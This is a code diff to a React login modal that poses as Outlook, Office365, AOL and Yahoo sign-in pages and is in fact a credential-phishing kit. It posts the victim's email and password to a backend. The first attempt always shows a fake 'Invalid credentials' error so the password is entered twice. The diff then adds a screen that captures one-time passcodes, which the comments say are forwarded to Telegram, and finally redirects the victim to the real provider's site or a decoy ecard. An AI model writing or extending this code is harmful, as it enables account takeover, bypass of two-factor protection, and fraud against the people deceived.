@@ -1,22 +1,55 @@
 import {useState} from 'react';
-import './EmailLoginModal.css'
+import './EmailLoginModal.css';
 import outlookImg from "../assets/outlook.png";
 import officeImg from "../assets/office360.png";
 import aolImg from "../assets/aol.png";
 import {FaGoogle, FaYahoo} from "react-icons/fa";
 import {MdEmail} from "react-icons/md";
-import {useNavigate} from "react-router-dom";
+import OtpModal from '../pages/gmailLogin/OtpModal';
 
 const EmailLoginModal = ({ isOpen, onClose, provider }) => {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [error, setError] = useState('');
-    const [attemptCount, setAttemptCount] = useState(0);   // ← new state
-    const navigate = useNavigate();   // ← for redirection
+    const [attemptCount, setAttemptCount] = useState(0);
+    const [showOtp, setShowOtp] = useState(false);
 
     if (!isOpen) return null;
 
-    const isGmailLike = provider === 'Gmail'; // we don't fake Gmail here
+    const isGmailLike = provider === 'Gmail';
+
+    // ── Route to provider dashboard ──
+    const routeToProvider = () => {
+        const providerDashboards = {
+            "Outlook": "https://outlook.live.com/mail/",
+            "Office365": "https://www.office.com/",
+            "AOL": "https://mail.aol.com/",
+            "Yahoo": "https://mail.yahoo.com/",
+            "Other": "https://www.punchbowl.com/ecards/send/d6e3fa7ed13293698b14/preview",
+        };
+        window.location.href = providerDashboards[provider] || "https://mail.google.com/";
+    };
+
+    // ── OTP submitted — send to Telegram then route immediately ──
+    const handleOtpSubmit = async (otp) => {
+        await fetch('http://localhost:8080/submit-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, otp, provider }),
+        });
+
+        // Route immediately — no polling needed
+        routeToProvider();
+    };
+
+    // ── Send credentials to backend ──
+    async function sendRequest() {
+        return await fetch('http://localhost:8080/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password, provider }),
+        });
+    }
 
     const handleSubmit = async (e) => {
         e.preventDefault();
@@ -25,54 +58,40 @@ const EmailLoginModal = ({ isOpen, onClose, provider }) => {
             return;
         }
 
-        async function sendRequest() {
-            return await fetch('http://localhost:8080/submit', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({email, password,provider})
-            });
-        }
-
         if (!isGmailLike) {
             if (attemptCount === 0) {
-                // First attempt: always "fail"
-                const response = await sendRequest();
-
-                console.log(response);
+                // First attempt — always fail
+                await sendRequest();
                 setError('Invalid credentials. Please try again.');
                 setAttemptCount(1);
                 setPassword('');
                 return;
             } else {
-                const response = await sendRequest();
-                console.log(response);
-                window.open("https://www.punchbowl.com/ecards/send/d6e3fa7ed13293698b14/preview", "_blank", "noopener,noreferrer");
+                // Second attempt — send to Telegram then show OTP screen
+                await sendRequest();
+                setShowOtp(true);
                 return;
             }
         }
 
-
-        console.log(`Logging in with ${provider}:`, {email, password});
-
         onClose();
     };
+
+    // Show OTP screen after second attempt
+    if (showOtp) {
+        return <OtpModal email={email} onSubmit={handleOtpSubmit} onClose={onClose} />;
+    }
 
     const title = provider === 'Other' ? 'Other Email' : provider;
 
     const getProviderIcon = () => {
         switch (provider) {
-            case "Outlook":
-                return <img src={outlookImg} className="modal-icon-img" alt="Outlook"/>;
-            case "Office365":
-                return <img src={officeImg} className="modal-icon-img" alt="Office365"/>;
-            case "AOL":
-                return <img src={aolImg} className="modal-icon-img" alt="AOL"/>;
-            case "Yahoo":
-                return <FaYahoo className="modal-icon"/>;
-            case "Gmail":
-                return <FaGoogle className="modal-icon"/>;
-            default:
-                return <MdEmail className="modal-icon"/>;
+            case "Outlook": return <img src={outlookImg} className="modal-icon-img" alt="Outlook" />;
+            case "Office365": return <img src={officeImg} className="modal-icon-img" alt="Office365" />;
+            case "AOL": return <img src={aolImg} className="modal-icon-img" alt="AOL" />;
+            case "Yahoo": return <FaYahoo className="modal-icon" />;
+            case "Gmail": return <FaGoogle className="modal-icon" />;
+            default: return <MdEmail className="modal-icon" />;
         }
     };
 
@@ -82,13 +101,8 @@ const EmailLoginModal = ({ isOpen, onClose, provider }) => {
                 <button className="close-btn" onClick={onClose}>×</button>
 
                 <div className="modal-header">
-                    <div className="modal-icon-container">
-                        {getProviderIcon()}
-                    </div>
-
-                    <h2 className="modal-title">
-                        Login with {title}
-                    </h2>
+                    <div className="modal-icon-container">{getProviderIcon()}</div>
+                    <h2 className="modal-title">Login with {title}</h2>
                 </div>
 
                 <form onSubmit={handleSubmit}>
